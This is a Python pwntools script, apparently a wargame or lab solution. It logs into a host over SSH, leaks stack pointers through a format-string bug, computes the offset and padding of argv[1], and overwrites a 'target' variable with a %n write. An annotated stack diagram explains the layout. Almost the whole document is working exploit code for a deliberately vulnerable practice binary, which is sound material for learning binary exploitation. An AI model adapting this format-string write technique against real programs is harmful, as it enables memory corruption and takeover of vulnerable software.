from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
target_addr = e.symbols['target']
log.info('target_addr: %08x', target_addr)

'''
      .
      .
  4   | bp_vuln
      +================ (printf)
  4   | vuln+X (call)
      +---------------- <-- sp_vuln    ($0, content not leakable as "$0" is not valid)
      | fmt ptr
 0x18 |----------------                 $1
      |     ...                         ..
      +---------------- <-- bp_vuln     $6
  4   | bp_main
      +================ (vuln)          $7
  4   | main+X (call)
      +---------------- <-- sp_main     $8 (content leakable!)
      | fmt ptr                       o----.
 0x10 |----------------                    |
      |     ...                            |
      +----------------                    |
  ?   | align & ~0xf                       |
      +---------------- <-- bp_main        |
  4   | bp_start                           |
      +================ (main)             |
  4   | start+X (call)                     |
      +----------------                    |
  ?   |     ...                            |
      +---------------- <------------------' (misalign possible)
  ?   | "<fmt> ... '\0'
      +----------------
  ?   |     ...
      `---------------- 0xbfffffff (stack)

'''


# Always use the same arg length to keep a consistent stack pointer between
# runs. Length is arbitrary but must be long enough to fit everything, increase
# if necessary.
ARG_SIZE = 50


def leak_stack_ptrs(count):
    fmt = fit(' '.join('%08x' for i in range(count)), length=ARG_SIZE)
    with s.system([args.BIN, fmt]) as p:
        return [None] + [int(x[:8], 16) for x in p.recv().split(' ')]  # None is $0


# Identify 2 key pointers
ptrs = leak_stack_ptrs(9)
bp_main, argv1 = ptrs[6], ptrs[8]

# Deduce from bp_main the stack pointer reference to use to derivate format
# printf index of argv[1]
sp_vuln = (bp_main & ~0xf) - 0x10 - 4 - 4 - 0x18

# We might miss the start of the string due to a 32-bit misalign (arg indices
# assume 32-bit steps), so we need to offset our target address and adjust the
# index
argv1_off = argv1 - sp_vuln
argv1_idx = argv1_off >> 2
missby = argv1_off - argv1_idx * 4
padding = 4 - missby
n_idx = argv1_idx + 1

log.info('sp_vuln: %08x', sp_vuln)
log.info('bp_main: %08x (+%d)', bp_main, bp_main - sp_vuln)
log.info('argv1:   %08x (+%d)', argv1, argv1_off)
log.info('missby:  %dB', missby)
log.info('padding: %dB', padding)
log.info('n_idx:   %d', n_idx)

fmt = fit({padding: p32(target_addr) + '%' + str(n_idx) + '$n', ARG_SIZE-1:'\n'})
with s.system([args.BIN, fmt]) as p:
    p.recvline()
    ret = p.recvline()
    assert ret == 'you have modified the target :)\n'
